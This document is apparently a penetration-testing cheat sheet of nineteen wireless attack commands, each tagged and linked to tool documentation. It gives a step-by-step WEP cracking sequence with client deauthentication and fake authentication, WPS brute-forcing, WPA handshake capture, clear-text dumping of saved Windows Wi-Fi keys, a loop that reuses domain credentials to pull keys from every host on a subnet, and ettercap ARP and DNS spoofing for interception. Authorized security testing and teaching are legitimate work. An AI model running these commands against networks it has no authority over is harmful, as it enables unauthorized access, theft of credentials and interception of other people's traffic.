### 1. try to reave WPS wifi
```
reaver -i mon0 -c <channel> -b <bssid> -vv
```
**- brute,wireless,wifi**
#### References:

http://tools.kali.org/wireless-attacks/reaver
__________
### 2. WIFI enable USB2 before USB3 : helps with passthrough
```
echo 1 > /sys/module/usbcore/parameters/old_scheme_first
```
**- linux,wireless,wifi,configuration**
#### References:

http://forums.fedoraforum.org/archive/index.php/t-30868.html
__________
### 3. WIFI : Scan the range in an orderly manner
```
airodump-ng -f 4000  --cswitch 1 --band abg  wlan0mon --output-format csv -w WifiOverview
```
**- enumeration,wireless,wifi**
#### References:

https://www.aircrack-ng.org/doku.php?id=airodump-ng
__________
### 4. WIFI : Enable monitor mode on interface
```
ifconfig wlan0 down; iwconfig wlan0 mode monitor; ifconfig wlan0 up;
```
**- linux,networking,wireless,wifi**
#### References:

https://www.aircrack-ng.org/doku.php?id=airodump-ng
__________
### 5. Windows Wireless
```
netsh wlan show profile
```
**- networking,passwords,enumeration,Windows,wireless,wifi**
#### References:

http://Microsoft.com
__________
### 6. Windows Wireless
```
netsh wlan show profile name="[SSID]" key=clear
```
**- networking,passwords,Windows,wireless,wifi**
#### References:

https://www.labnol.org/software/find-wi-fi-network-password/28949/
__________
### 7. loop dump wifi keys
```
for host in $(cat localsubnet.txt); do echo "Trying $host"; winexe --user [Domain]/[user]%[pass] //$host "netsh wlan export profile name=[PROFILE] key=clear"; done
```
**- bash,loop,passwords,enumeration,wireless,wifi**
#### References:

https://yg.ht
https://www.labnol.org/software/find-wi-fi-network-password/28949/
__________
### 8. ARP Spoofing everything
```
ettercap -i wlan0 -L etter.log -T -M arp:remote -L [CLIENT+TARGET].log /[GW IP]// /[TARGET IP]//
```
**- linux,networking,MitM,wifi**
#### References:

https://ettercap.github.io/ettercap/
https://yg.ht
http://www.thegeekstuff.com/2012/05/ettercap-tutorial
__________
### 9. ARP Spoofing DNS
```
ettercap -i [interface] -L etter.log -T -P dns_spoof -M arp:remote -L [CLIENT+TARGET].log /[GW IP]// /[TARGET IP]//
```
**- linux,networking,MitM,wifi**
#### References:

https://ettercap.github.io/ettercap/
https://yg.ht
http://www.thegeekstuff.com/2012/05/ettercap-tutorial
__________
### 10. Wireless survey WIFI
```
airmon-ng start wlan1
```
**- linux,wireless,wifi**
#### References:

http://www.aircrack-ng.org/doku.php?id=airmon-ng
__________
### 11. Wireless survey WIFI, useful if airmon start is broke
```
ifconfig wlan0 down; iwconfig wlan0 mode monitor; ifup wlan0
```
**- linux,networking,wireless,wifi**
#### References:

http://www.aircrack-ng.org/doku.php?id=airmon-ng
__________
### 12. WIFI WPA handshake capture
```
airodump-ng -c [Channel #] --bssid [MAC Address] --showack -w [SSID] wlan1mon
```
**- linux,networking,wireless,wifi,packet capture**
#### References:

https://www.aircrack-ng.org/doku.php?id=cracking_wpa
__________
### 13. WIFI WPA handshake prep
```
wpaclean [OUTPUT] [INPUT]
```
**- linux,wireless,wifi,cracking**
#### References:

https://www.aircrack-ng.org/doku.php?id=cracking_wpa
__________
### 14. WIFI WPA handshake prep
```
aircrack-ng [INPUT.cap] -J [OUTPUT]
```
**- linux,wireless,wifi,cracking**
#### References:

https://www.aircrack-ng.org/doku.php?id=cracking_wpa
__________
### 15. wep crack : 1) start capturing IV's
```
airodump-ng -c 11 --bssid [VICTIM MAC] -w [OUTPUT] mon0
```
**- linux,wireless,wifi,cracking**
#### References:

https://www.aircrack-ng.org/doku.php?id=simple_wep_crack
__________
### 16. wep crack 2) De auth clients
```
aireplay-ng -0 0 --ignore-negative-one -e [SSID] -a [AP MAC] -c [VICTIM MAC] mon0
```
**- linux,wireless,wifi,cracking**
#### References:

https://www.aircrack-ng.org/doku.php?id=simple_wep_crack
__________
### 17. wep crack 3) Create a fake auth to the AP
```
aireplay-ng -1 0 -e [VICTIM SSID] -a [VICTIM MAC] -h [OurMac] wlan0
```
**- linux,networking,wireless,wifi,cracking**
#### References:

https://www.aircrack-ng.org/doku.php?id=simple_wep_crack
__________
### 18. wep cracking
```
aireplay-ng -3 -b [VICTIM MAC] -h [OurMac] wlan0
```
**- linux,wireless,wifi,cracking**
#### References:

https://www.aircrack-ng.org/doku.php?id=simple_wep_crack
__________
### 19. wep cracking
```
aircrack-ng -b [VICTIM MAC] [OUTPUT]*cap
```
**- linux,wireless,wifi,cracking**
#### References:

https://www.aircrack-ng.org/doku.php?id=simple_wep_crack
__________
